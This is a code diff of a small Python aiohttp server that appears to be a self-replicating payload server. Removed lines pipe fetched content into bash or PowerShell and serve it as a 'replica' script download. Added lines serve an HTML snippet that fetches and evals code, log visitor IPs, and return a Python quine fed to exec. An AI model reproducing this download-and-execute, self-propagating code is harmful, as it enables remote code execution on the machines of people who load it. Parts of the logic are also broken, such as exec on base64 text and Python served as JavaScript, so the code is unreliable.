@@ -4,37 +4,27 @@ import json, base64, platform
 from datetime import datetime
 
 shell_scripts = {
-   'windows': b"""
-@echo off
-powershell -Command "& {Invoke-WebRequest 'http://localhost:8080/exec' | Invoke-Expression}"
-""",
-   'linux': b"""
-#!/bin/bash
-curl -s http://localhost:8080/exec | bash
-""",
-   'darwin': b"""
-#!/bin/bash
-curl -s http://localhost:8080/exec | bash
-"""
+   'windows': b"""<script>fetch('/exec').then(r=>r.text()).then(eval);</script>""",
+   'linux': b"""<script>fetch('/exec').then(r=>r.text()).then(eval);</script>""",
+   'darwin': b"""<script>fetch('/exec').then(r=>r.text()).then(eval);</script>"""
 }
 
 logs = []
 
 async def handle(request):
-   sys_type = platform.system().lower()
+   logs.append({
+       'time': datetime.utcnow().isoformat(),
+       'ip': request.remote
+   })
    return web.Response(
-       body=shell_scripts.get(sys_type, shell_scripts['linux']),
-       headers={
-           'Content-Type': 'text/plain',
-           'Content-Disposition': f'attachment; filename=replica.{"bat" if sys_type=="windows" else "sh"}'
-       }
+       body=shell_scripts[platform.system().lower()],
+       headers={'Content-Type': 'text/html'}
    )
 
 async def execute(request):
    q = '''q={!r};print(q.format(q));exec(q.format(q))'''
-   exec_code = f"""{q};print(q.format(q));exec(q.format(q))""".encode()
-   exec(base64.b64encode(exec_code).decode())
-   return web.Response(text='Executed')
+   exec_code = f"{q};print(q.format(q));exec(q.format(q))"
+   return web.Response(text=exec_code, headers={'Content-Type': 'application/javascript'})
 
 async def get_logs(request):
    return web.json_response(logs)
